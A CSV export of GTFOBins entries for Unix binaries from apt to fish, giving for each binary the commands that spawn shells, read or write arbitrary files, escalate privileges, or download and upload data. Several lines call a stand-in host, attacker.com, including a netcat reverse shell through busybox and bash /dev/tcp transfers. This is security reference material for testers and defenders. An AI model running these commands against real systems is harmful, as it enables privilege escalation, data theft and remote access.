Binary Name,URL,Description,Functions,Examples
apt,https://gtfobins.org/gtfobins/apt/,Alias of apt-get. This executable can inherit functions from another.,Inherit; Shell,"apt-get changelog apt; echo 'Dpkg::Pre-Invoke {""/bin/sh;false""}' >/path/to/temp-file
apt-get -y install -c /path/to/temp-file sl; apt-get update -o APT::Update::Pre-Invoke::=/bin/sh"
apt-get,https://gtfobins.org/gtfobins/apt-get/,This executable can inherit functions from another.,Inherit; Shell,"apt-get changelog apt; echo 'Dpkg::Pre-Invoke {""/bin/sh;false""}' >/path/to/temp-file
apt-get -y install -c /path/to/temp-file sl; apt-get update -o APT::Update::Pre-Invoke::=/bin/sh"
aptitude,https://gtfobins.org/gtfobins/aptitude/,This executable can inherit functions from another.,Inherit,aptitude changelog aptitude
ar,https://gtfobins.org/gtfobins/ar/,This executable can read data from local files.,File read,"ar r /path/to/output-file /path/to/input-file
ar p /path/to/output-file"
arch-nspawn,https://gtfobins.org/gtfobins/arch-nspawn/,This executable can spawn an interactive system shell.,Shell,"mkdir -p ./etc/
grep -oP ""^CHROOT_VERSION='\K[^']+"" /usr/share/devtools/lib/archroot.sh >.arch-chroot
touch ./etc/pacman.conf
echo 'CARCH=true;/bin/sh;exit' >etc/makepkg.conf
arch-nspawn ."
aria2c,https://gtfobins.org/gtfobins/aria2c/,This executable can run non-interactive system commands.,Command; Download; File read,"echo /path/to/command >/path/to/temp-file
chmod +x /path/to/temp-file
aria2c --on-download-error=/path/to/temp-file http://some-invalid-domain; aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=/bin/sh http://attacker.com/aaaaaaaaaaaaaaaa; aria2c -o /path/to/ouput-file http://attacker.com/path/to/input-file"
arj,https://gtfobins.org/gtfobins/arj/,This executable can read data from local files.,File read; File write,"arj a /path/to/output-file /path/to/input-file
arj p /path/to/output-file; echo DATA >output-file
arj a x output-file
arj e x /path/to/output-dir/"
arp,https://gtfobins.org/gtfobins/arp/,This executable can read data from local files.,File read,arp -v -f /path/to/input-file
as,https://gtfobins.org/gtfobins/as/,This executable can read data from local files.,File read,as @/path/to/input-file
ascii-xfr,https://gtfobins.org/gtfobins/ascii-xfr/,This executable can read data from local files.,File read,ascii-xfr -ns /path/to/input-file
ascii85,https://gtfobins.org/gtfobins/ascii85/,This executable can read data from local files.,File read,ascii85 /path/to/input-file | ascii85 --decode
ash,https://gtfobins.org/gtfobins/ash/,This executable can write data to local files.,File write; Shell,ash -c 'echo DATA >/path/to/output-file'; ash -p -c 'echo DATA >/path/to/output-file'; ash
aspell,https://gtfobins.org/gtfobins/aspell/,This executable can read data from local files.,File read,aspell -c /path/to/input-file; aspell --conf /path/to/input-file
asterisk,https://gtfobins.org/gtfobins/asterisk/,This executable can spawn an interactive system shell.,Shell,"asterisk -r
!/bin/sh"
at,https://gtfobins.org/gtfobins/at/,This executable can run non-interactive system commands.,Command; Shell,"echo /path/to/command | at now; echo ""/bin/sh <$(tty) >$(tty) 2>$(tty)"" | at now; tail -f /dev/null"
atobm,https://gtfobins.org/gtfobins/atobm/,This executable can read data from local files.,File read,atobm /path/to/input-file
autoconf,https://gtfobins.org/gtfobins/autoconf/,This executable can spawn an interactive system shell.,Shell,"echo /bin/sh >/path/to/temp-file
chmod +x /path/to/temp-file
touch configure.ac
AUTOM4TE=/path/to/temp-file autoconf"
autoheader,https://gtfobins.org/gtfobins/autoheader/,This executable can spawn an interactive system shell.,Shell,"echo '/bin/sh 1>&0' >/path/to/temp-file
chmod +x /path/to/temp-file
touch configure.ac
AUTOM4TE=/path/to/temp-file autoheader"
autoreconf,https://gtfobins.org/gtfobins/autoreconf/,This executable can spawn an interactive system shell.,Shell,"echo '/bin/sh 1>&0' >/path/to/temp-file
chmod +x /path/to/temp-file
echo AC_INIT >configure.ac
AUTOM4TE=/path/to/temp-file autoreconf"
awk,https://gtfobins.org/gtfobins/awk/,Alias of mawk. This executable can read data from local files.,File read; File write; Shell,"mawk '//' /path/to/input-file; mawk 'BEGIN { print ""DATA"" > ""/path/to/output-file"" }'; mawk 'BEGIN {system(""/bin/sh"")}'"
aws,https://gtfobins.org/gtfobins/aws/,This executable can read data from local files.,File read; Inherit,aws ec2 describe-instances --filter file:///path/to/input-file; aws help
base32,https://gtfobins.org/gtfobins/base32/,This executable can read data from local files.,File read,base32 /path/to/input-file | base32 --decode
base58,https://gtfobins.org/gtfobins/base58/,This executable can read data from local files.,File read,base58 /path/to/input-file | base58 --decode
base64,https://gtfobins.org/gtfobins/base64/,This executable can read data from local files.,File read,base64 /path/to/input-file | base64 --decode
basenc,https://gtfobins.org/gtfobins/basenc/,This executable can read data from local files.,File read,basenc --base64 /path/to/input-file | basenc -d --base64
basez,https://gtfobins.org/gtfobins/basez/,This executable can read data from local files.,File read,basez /path/to/input-file | basez --decode
bash,https://gtfobins.org/gtfobins/bash/,This executable can download remote data.,Download; File read; File write; Library load; Reverse shell; Shell; Upload,"bash -c '{ echo -ne ""GET /path/to/input-file HTTP/1.0\r\nhost: attacker.com\r\n\r\n"" 1>&3; cat 0<&3; } \
    3<>/dev/tcp/attacker.com/12345 \
    | { while read -r; do [ ""$REPLY"" = ""$(echo -ne ""\r"")"" ] && break; done; cat; } >/path/to/output-file'; bash -p -c '{ echo -ne ""GET /path/to/input-file HTTP/1.0\r\nhost: attacker.com\r\n\r\n"" 1>&3; cat 0<&3; } \
    3<>/dev/tcp/attacker.com/12345 \
    | { while read -r; do [ ""$REPLY"" = ""$(echo -ne ""\r"")"" ] && break; done; cat; } >/path/to/output-file'; bash -c 'echo ""$(</dev/tcp/attacker.com/12345) >/path/to/output-file'"
bashbug,https://gtfobins.org/gtfobins/bashbug/,This executable can inherit functions from another.,Inherit,bashbug
batcat,https://gtfobins.org/gtfobins/batcat/,This executable can inherit functions from another.,Inherit,batcat --paging always /etc/hosts
bbot,https://gtfobins.org/gtfobins/bbot/,This executable can read data from local files.,File read,bbot -d -cy /path/to/input-file
bc,https://gtfobins.org/gtfobins/bc/,This executable can read data from local files.,File read,"bc -s /path/to/input-file
quit"
bconsole,https://gtfobins.org/gtfobins/bconsole/,This executable can read data from local files.,File read; Shell,"bconsole -c /path/to/file-input; bconsole
@exec /bin/sh"
bee,https://gtfobins.org/gtfobins/bee/,This executable can inherit functions from another.,Inherit,bee eval '...'
borg,https://gtfobins.org/gtfobins/borg/,This executable can spawn an interactive system shell.,Shell,"borg extract @:/::: --rsh ""/bin/sh -c '/bin/sh </dev/tty >/dev/tty 2>/dev/tty'"""
bpftrace,https://gtfobins.org/gtfobins/bpftrace/,This executable can spawn an interactive system shell.,Shell,"bpftrace --unsafe -e 'BEGIN {system(""/bin/sh 1<&0"");exit()}'; echo 'BEGIN {system(""/bin/sh 1<&0"");exit()}' >/path/to/temp-file
bpftrace --unsafe /path/to/temp-file; bpftrace -c /bin/sh -e 'END {exit()}'"
bridge,https://gtfobins.org/gtfobins/bridge/,This executable can read data from local files.,File read,bridge -b /path/to/input-file
bundle,https://gtfobins.org/gtfobins/bundle/,This executable can inherit functions from another.,Inherit; Shell,"bundle help; touch Gemfile
bundle console; BUNDLE_GEMFILE=x bundle exec /bin/sh"
bundler,https://gtfobins.org/gtfobins/bundler/,Alias of bundle. This executable can inherit functions from another.,Inherit; Shell,"bundle help; touch Gemfile
bundle console; BUNDLE_GEMFILE=x bundle exec /bin/sh"
busctl,https://gtfobins.org/gtfobins/busctl/,This executable can inherit functions from another.,Inherit; Shell,"busctl --show-machine; busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'; busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'"
busybox,https://gtfobins.org/gtfobins/busybox/,"BusyBox may contain many utilities, run `busybox --list-full` to check what other binaries are supported.",Inherit; Reverse shell; Upload,busybox ash; busybox cat; busybox nc -e /bin/sh attacker.com 12345
byebug,https://gtfobins.org/gtfobins/byebug/,This executable can inherit functions from another.,Inherit,byebug --no-stop /path/to/script.rb
bzip2,https://gtfobins.org/gtfobins/bzip2/,"There are also a number of other utilities that rely on `bzip2` under the hood, e.g., `bzless`, `bzcat`, `bunzip2`, etc. Besides having similar features, they also allow privileged reads if `bzip2` itself is SUID.",File read,bzip2 -c /path/to/input-file | bzip2 -d
c89,https://gtfobins.org/gtfobins/c89/,Alias of gcc. This executable can read data from local files.,File read; File write; Shell,gcc -x c -E /path/to/input-file; gcc @/path/to/input-file; gcc -x c /dev/null -o /path/to/input-file
c99,https://gtfobins.org/gtfobins/c99/,Alias of gcc. This executable can read data from local files.,File read; File write; Shell,gcc -x c -E /path/to/input-file; gcc @/path/to/input-file; gcc -x c /dev/null -o /path/to/input-file
cabal,https://gtfobins.org/gtfobins/cabal/,This executable can spawn an interactive system shell.,Shell,cabal exec --project-file=/dev/null -- /bin/sh; cabal exec --project-file=/dev/null -- /bin/sh -p
cancel,https://gtfobins.org/gtfobins/cancel/,This executable can upload local data.,Upload,cancel -h attacker.com:12345 -u DATA
capsh,https://gtfobins.org/gtfobins/capsh/,This executable can spawn an interactive system shell.,Shell,capsh --; capsh --gid=0 --uid=0 --
cargo,https://gtfobins.org/gtfobins/cargo/,This executable can inherit functions from another.,Inherit,cargo help doc
cat,https://gtfobins.org/gtfobins/cat/,This executable can read data from local files.,File read,cat /path/to/input-file
cc,https://gtfobins.org/gtfobins/cc/,Alias of gcc. This executable can read data from local files.,File read; File write; Shell,gcc -x c -E /path/to/input-file; gcc @/path/to/input-file; gcc -x c /dev/null -o /path/to/input-file
cdist,https://gtfobins.org/gtfobins/cdist/,This executable can spawn an interactive system shell.,Shell,cdist shell -s /bin/sh
certbot,https://gtfobins.org/gtfobins/certbot/,This executable can spawn an interactive system shell.,Shell,certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir . --work-dir . --config-dir . --pre-hook '/bin/sh 1>&0 2>&0'
chattr,https://gtfobins.org/gtfobins/chattr/,"This executable provides a mechanism for privilege escalation by indirectly enabling elevated privileges, such as setting the SUID bit or modifying the ownership of another executable.",Privilege escalation,chattr +i /path/to/input-file
check_by_ssh,https://gtfobins.org/gtfobins/check_by_ssh/,"This is the `check_by_ssh` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`.",Shell,"check_by_ssh -o ""ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)"" -H localhost -C x"
check_cups,https://gtfobins.org/gtfobins/check_cups/,"This is the `check_cups` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`.",File read,check_cups --extra-opts=@/path/to/input-file
check_log,https://gtfobins.org/gtfobins/check_log/,"This is the `check_log` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`.",File read; File write,check_log -F /path/to/input-file -O /dev/stdout; check_log -F /path/to/input-file -O /path/to/output-file
check_memory,https://gtfobins.org/gtfobins/check_memory/,"This is the `check_memory` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`.",File read,check_memory --extra-opts=@/path/to/input-file
check_raid,https://gtfobins.org/gtfobins/check_raid/,"This is the `check_raid` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`.",File read,check_raid --extra-opts=@/path/to/input-file
check_ssl_cert,https://gtfobins.org/gtfobins/check_ssl_cert/,"This is the `check_ssl_cert` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`.",Shell,"echo 'exec /bin/sh 0<&2 1>&2' >/path/to/temp-file
chmod +x /path/to/temp-file
check_ssl_cert --grep-bin /path/to/temp-file -H x"
check_statusfile,https://gtfobins.org/gtfobins/check_statusfile/,"This is the `check_statusfile` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`.",File read,check_statusfile /path/to/input-file
chmod,https://gtfobins.org/gtfobins/chmod/,"This executable provides a mechanism for privilege escalation by indirectly enabling elevated privileges, such as setting the SUID bit or modifying the ownership of another executable.",Privilege escalation,chmod 6777 /path/to/input-file
choom,https://gtfobins.org/gtfobins/choom/,This executable can spawn an interactive system shell.,Shell,choom -n 0 /bin/sh; choom -n 0 -- /bin/sh -p
chown,https://gtfobins.org/gtfobins/chown/,"This executable provides a mechanism for privilege escalation by indirectly enabling elevated privileges, such as setting the SUID bit or modifying the ownership of another executable.",Privilege escalation,chown $(id -un):$(id -gn) /path/to/input-file
chroot,https://gtfobins.org/gtfobins/chroot/,This executable can spawn an interactive system shell.,Shell,chroot /; chroot / /bin/sh -p
chrt,https://gtfobins.org/gtfobins/chrt/,This executable can spawn an interactive system shell.,Shell,chrt 1 /bin/sh; chrt 1 /bin/sh -p
clamscan,https://gtfobins.org/gtfobins/clamscan/,This executable can read data from local files.,File read,"touch x.yara
clamscan --no-summary -d x.yara -f /path/to/input-file 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'"
clisp,https://gtfobins.org/gtfobins/clisp/,This executable can spawn an interactive system shell.,Shell,"clisp -x '(ext:run-shell-command ""/bin/sh"")(ext:exit)'"
cmake,https://gtfobins.org/gtfobins/cmake/,This executable can read data from local files.,File read; Shell,"cmake -E cat /path/to/input-file; echo 'execute_process(COMMAND /bin/sh)' >/path/to/CMakeLists.txt
cmake /path/to/"
cmp,https://gtfobins.org/gtfobins/cmp/,This executable can read data from local files.,File read,cmp /path/to/input-file /dev/zero -b -l
cobc,https://gtfobins.org/gtfobins/cobc/,This executable can spawn an interactive system shell.,Shell,"echo 'CALL ""SYSTEM"" USING ""/bin/sh"".' >/path/to/temp-file
cobc -xFj --frelax-syntax-checks /path/to/temp-file"
code,https://gtfobins.org/gtfobins/code/,This executable can download remote data.,Download; Reverse shell; Upload,code tunnel --name xxxxxx
codex,https://gtfobins.org/gtfobins/codex/,This executable can spawn an interactive system shell.,Shell,codex sandbox linux /bin/sh
column,https://gtfobins.org/gtfobins/column/,This executable can read data from local files.,File read,column /path/to/input-file
comm,https://gtfobins.org/gtfobins/comm/,This executable can read data from local files.,File read,comm /path/to/input-file /dev/null
composer,https://gtfobins.org/gtfobins/composer/,This executable can spawn an interactive system shell.,Shell,"echo '{""scripts"":{""x"":""/bin/sh""}}' >composer.json
composer run-script x"
cowsay,https://gtfobins.org/gtfobins/cowsay/,This executable can inherit functions from another.,Inherit,cowsay -f /path/to/script.pl x
cowthink,https://gtfobins.org/gtfobins/cowthink/,This executable can inherit functions from another.,Inherit,cowthink -f /path/to/script.pl x
cp,https://gtfobins.org/gtfobins/cp/,This executable can read data from local files.,File read; File write; Privilege escalation,cp /path/to/input-file /dev/stdout; echo DATA | cp /dev/stdin /path/to/output-file; cp /path/to/input-file /path/to/output-file
cpan,https://gtfobins.org/gtfobins/cpan/,This executable can inherit functions from another.,Inherit,"cpan
! ..."
cpio,https://gtfobins.org/gtfobins/cpio/,This executable can read data from local files.,File read; File write; Shell,"echo /path/to/input-file | cpio -o; echo /path/to/input-file | cpio -dp .
cat path/to/input-file; echo /path/to/input-file | cpio -R $UID -dp .
cat path/to/input-file"
cpulimit,https://gtfobins.org/gtfobins/cpulimit/,This executable can spawn an interactive system shell.,Shell,cpulimit -l 100 -f /bin/sh; cpulimit -l 100 -f /bin/sh -p
crash,https://gtfobins.org/gtfobins/crash/,This executable can run non-interactive system commands.,Command; Inherit,CRASHPAGER=/path/to/command crash -h; crash -h
crontab,https://gtfobins.org/gtfobins/crontab/,This executable can run non-interactive system commands.,Command; Inherit,crontab -e
csh,https://gtfobins.org/gtfobins/csh/,This executable can write data to local files.,File write; Shell,csh -c 'echo DATA >/path/to/output-file'; csh -c 'echo DATA >/path/to/output-file' -b; csh
csplit,https://gtfobins.org/gtfobins/csplit/,This executable can read data from local files.,File read; File write,"csplit /path/to/input-file 1
cat xx01; echo DATA >/path/to/temp-file
csplit -z -b '%doutput-file' /path/to/temp-file 1"
csvtool,https://gtfobins.org/gtfobins/csvtool/,This executable can read data from local files.,File read; File write; Shell,"csvtool trim t /path/to/input-file; echo DATA >/path/to/temp-file
csvtool trim t /path/to/temp-file -o /path/to/output-file; csvtool call '/bin/sh;false' /etc/hosts"
ctr,https://gtfobins.org/gtfobins/ctr/,This executable can spawn an interactive system shell.,Shell,"ctr run --rm --mount type=bind,src=/,dst=/,options=rbind -t docker.io/library/alpine:latest x"
cupsfilter,https://gtfobins.org/gtfobins/cupsfilter/,This executable can read data from local files.,File read,cupsfilter -i application/octet-stream -m application/octet-stream /path/to/input-file
curl,https://gtfobins.org/gtfobins/curl/,This executable can download remote data.,Download; File read; File write; Library load; Upload,curl http://attacker.com/path/to/input-file -o /path/to/output-file; python -m http.server 80; curl file:///path/to/input-file
cut,https://gtfobins.org/gtfobins/cut/,This executable can read data from local files.,File read,cut -d '' -f1 /path/to/input-file
dash,https://gtfobins.org/gtfobins/dash/,This executable can write data to local files.,File write; Shell,dash -c 'echo DATA >/path/to/output-file'; dash
date,https://gtfobins.org/gtfobins/date/,This executable can read data from local files.,File read,date -f /path/to/input-file
dc,https://gtfobins.org/gtfobins/dc/,This executable can spawn an interactive system shell.,Shell,dc -e '!/bin/sh'
dd,https://gtfobins.org/gtfobins/dd/,This executable can read data from local files.,File read; File write,dd if=/path/to/input-file; echo DATA | dd of=/path/to/output-file
debugfs,https://gtfobins.org/gtfobins/debugfs/,This executable can spawn an interactive system shell.,Shell,"debugfs
!/bin/sh"
dhclient,https://gtfobins.org/gtfobins/dhclient/,This executable can spawn an interactive system shell.,Shell,dhclient -sf /bin/sh
dialog,https://gtfobins.org/gtfobins/dialog/,This executable can read data from local files.,File read,dialog --textbox /path/to/input-file 0 0
diff,https://gtfobins.org/gtfobins/diff/,This executable can read data from local files.,File read,diff --line-format=%L /dev/null /path/to/input-file; diff --recursive /path/to/empty-dir /path/to/input-dir/
dig,https://gtfobins.org/gtfobins/dig/,This executable can read data from local files.,File read,dig -f /path/to/input-file
distcc,https://gtfobins.org/gtfobins/distcc/,This executable can spawn an interactive system shell.,Shell,distcc /bin/sh; distcc /bin/sh -p
dmesg,https://gtfobins.org/gtfobins/dmesg/,This executable can read data from local files.,File read; Inherit,dmesg -rF /path/to/input-file; dmesg -H
dmidecode,https://gtfobins.org/gtfobins/dmidecode/,This executable can write data to local files.,File write,dmidecode --no-sysfs -d x.dmi --dump-bin /path/to/output-file
dmsetup,https://gtfobins.org/gtfobins/dmsetup/,This executable can spawn an interactive system shell.,Shell,"dmsetup create base <<EOF
0 3534848 linear /dev/loop0 94208
EOF
dmsetup ls --exec '/bin/sh -s'; dmsetup create base <<EOF
0 3534848 linear /dev/loop0 94208
EOF
dmsetup ls --exec '/bin/sh -p -s'"
dnf,https://gtfobins.org/gtfobins/dnf/,This executable can run non-interactive system commands.,Command,dnf install -y x-1.0-1.noarch.rpm --disablerepo=*
dnsmasq,https://gtfobins.org/gtfobins/dnsmasq/,This executable can run non-interactive system commands.,Command,dnsmasq --conf-script='/path/to/command 1>&2'
doas,https://gtfobins.org/gtfobins/doas/,This executable can spawn an interactive system shell.,Shell,doas -u root /bin/sh
docker,https://gtfobins.org/gtfobins/docker/,"This requires the user to be privileged enough to run `docker`, e.g., being in the `docker` group or being `root`.",File read; File write; Shell,"docker cp /path/to/input-file $CONTAINER_ID:input-file
docker cp $CONTAINER_ID:input-file /path/to/temp-file
cat /path/to/temp-file; echo DATA >/path/to/temp-file
docker cp /path/to/temp-file $CONTAINER_ID:temp-file
docker cp $CONTAINER_ID /path/to/output-file; docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh"
dos2unix,https://gtfobins.org/gtfobins/dos2unix/,This executable can read data from local files.,File read; File write,dos2unix -f -O /path/to/input-file; dos2unix -f -n /path/to/input-file /path/to/output-file
dosbox,https://gtfobins.org/gtfobins/dosbox/,"Basically `dosbox` allows to mount the local file system, so that it can be altered using DOS commands. Note that the DOS filename convention ([8.3](https://en.wikipedia.org/wiki/8.3_filename)) is used.",File read; File write,"dosbox -c 'mount c /' -c 'type c:\path\to\input'; dosbox -c 'mount c /' -c 'copy c:\path\to\input c:\path\to\output' -c exit
cat /path/to/OUTPUT; dosbox -c 'mount c /' -c ""echo DATA >c:\path\to\output"" -c exit"
dotnet,https://gtfobins.org/gtfobins/dotnet/,This executable can read data from local files.,File read; Shell,"dotnet fsi
System.IO.File.ReadAllText(""/path/to/input-file"");;; dotnet fsi
System.Diagnostics.Process.Start(""/bin/sh"").WaitForExit();;"
dpkg,https://gtfobins.org/gtfobins/dpkg/,This executable can inherit functions from another.,Inherit; Shell,dpkg -l; dpkg -i x_1.0_all.deb
dstat,https://gtfobins.org/gtfobins/dstat/,This executable can inherit functions from another.,Inherit,dstat --xxx
dvips,https://gtfobins.org/gtfobins/dvips/,This executable can spawn an interactive system shell.,Shell,dvips -R0 texput.dvi
easy_install,https://gtfobins.org/gtfobins/easy_install/,This executable can inherit functions from another.,Inherit,"echo '...' >setup.py
easy_install ."
easyrsa,https://gtfobins.org/gtfobins/easyrsa/,This executable can spawn an interactive system shell.,Shell,"echo 'set_var X ""$(/bin/sh 1>&0)""' >/path/to/temp-file
easyrsa --vars=/path/to/temp-file"
eb,https://gtfobins.org/gtfobins/eb/,For this to work the target must be connected to an AWS instance via EB CLI.,Inherit,eb logs
ed,https://gtfobins.org/gtfobins/ed/,This executable can read data from local files.,File read; File write; Shell,"ed /path/to/input-file
,p
q; ed /path/to/output-file
a
DATA
.
w
q; ed
!/bin/sh
q"
efax,https://gtfobins.org/gtfobins/efax/,This executable can read data from local files.,File read,efax -d /path/to/input-file
egrep,https://gtfobins.org/gtfobins/egrep/,This executable can read data from local files.,File read,grep '' /path/to/input-file
elvish,https://gtfobins.org/gtfobins/elvish/,This executable can read data from local files.,File read; File write; Shell,elvish -c 'print (slurp </path/to/input-file)'; elvish -c 'print DATA >/path/to/output-file'; elvish
emacs,https://gtfobins.org/gtfobins/emacs/,All the functions operate in the Emacs terminal interface.,File read; File write; Shell,"emacs /path/to/input-file; emacs /path/to/output-file
DATA
C-x C-s; emacs -Q -nw --eval '(term ""/bin/sh"")'"
enscript,https://gtfobins.org/gtfobins/enscript/,This executable can spawn an interactive system shell.,Shell,enscript /dev/null -qo /dev/null -I '/bin/sh >&2'
env,https://gtfobins.org/gtfobins/env/,This executable can spawn an interactive system shell.,Shell,env /bin/sh; env /bin/sh -p
eqn,https://gtfobins.org/gtfobins/eqn/,This executable can read data from local files.,File read,eqn /path/to/input-file
espeak,https://gtfobins.org/gtfobins/espeak/,This executable can read data from local files.,File read,espeak -qXf /path/to/input-file
ex,https://gtfobins.org/gtfobins/ex/,This executable can inherit functions from another.,Inherit; Shell,ex; ex -c ':!/bin/sh'
exiftool,https://gtfobins.org/gtfobins/exiftool/,This executable can read data from local files.,File read; File write; Inherit,"exiftool -filename=/path/to/output-file /path/to/input-file
cat /path/to/output-file; exiftool -filename=/path/to/output-file /path/to/input-file; exiftool ""-description<=/path/to/input-file --filename /path/to/output-file"
expand,https://gtfobins.org/gtfobins/expand/,This executable can read data from local files.,File read,expand /path/to/input-file
expect,https://gtfobins.org/gtfobins/expect/,This executable can read data from local files.,File read; Shell,expect /path/to/input-file; expect -c 'spawn /bin/sh;interact'; expect -c 'spawn /bin/sh -p;interact'
facter,https://gtfobins.org/gtfobins/facter/,This executable can inherit functions from another.,Inherit,FACTERLIB=/path/to/dir/ facter; facter --custom-dir=/path/to/dir/ x
fail2ban-client,https://gtfobins.org/gtfobins/fail2ban-client/,This executable can run non-interactive system commands.,Command,"fail2ban-client add x
fail2ban-client set x addaction x
fail2ban-client set x action x actionban /path/to/command
fail2ban-client start x
fail2ban-client set x banip 999.999.999.999
fail2ban-client set x unbanip 999.999.999.999
fail2ban-client stop x; cat >/path/to/temp-dir/fail2ban.conf <<EOF
[Definition]
EOF

cat >/path/to/temp-dir/jail.local <<EOF
[x]
enabled = true
action = x
EOF

mkdir -p /path/to/temp-dir/action.d/
cat >/path/to/temp-dir/action.d/x.conf <<EOF
[Definition]
actionstart = /path/to/command
EOF

mkdir -p /path/to/temp-dir/filter.d/
cat >/path/to/temp-dir/filter.d/x.conf <<EOF
[Definition]
EOF

fail2ban-client -c /path/to/temp-dir/ -v restart"
fastfetch,https://gtfobins.org/gtfobins/fastfetch/,This executable can run non-interactive system commands.,Command; File read; Shell,"echo '{""modules"":[{""type"":""command"",""key"":""x"",""text"":""exec /path/to/command""}]}' >/path/to/temp-file.jsonc
fastfetch -c /path/to/temp-file.jsonc; fastfetch --file /path/to/input-file; echo '{""modules"":[{""type"":""command"",""key"":""x"",""text"":""exec /bin/sh 1>&0 2>&0""}]}' >/path/to/temp-file.jsonc
fastfetch -c /path/to/temp-file.jsonc"
ffmpeg,https://gtfobins.org/gtfobins/ffmpeg/,This executable can load shared libraries that may be used to run arbitrary code in the same execution context.,Library load,"ffmpeg -f lavfi -i anullsrc -af ladspa=file=/path/to/lib.so /path/to/temp-file.wav
reset^J; echo '__attribute__((constructor)) init() { execl(""/bin/sh"", ""sh"", 0); }' \
    | gcc -w -fPIC -shared -o lib.so -x c -"
fgrep,https://gtfobins.org/gtfobins/fgrep/,This executable can read data from local files.,File read,grep '' /path/to/input-file
file,https://gtfobins.org/gtfobins/file/,This executable can read data from local files.,File read,file -f /path/to/input-file; file -m /path/to/input-file
find,https://gtfobins.org/gtfobins/find/,This executable can read data from local files.,File read; File write; Shell,find /path/to/input-file -exec cat {} \;; find / -fprintf /path/to/output-file DATA -quit; find . -exec /bin/sh \; -quit
finger,https://gtfobins.org/gtfobins/finger/,This executable can download remote data.,Download; Upload,finger x@attacker.com; finger DATA@attacker.com
firejail,https://gtfobins.org/gtfobins/firejail/,This executable can spawn an interactive system shell.,Shell,firejail /bin/sh
fish,https://gtfobins.org/gtfobins/fish/,This executable can spawn an interactive system shell.,Shell,fish
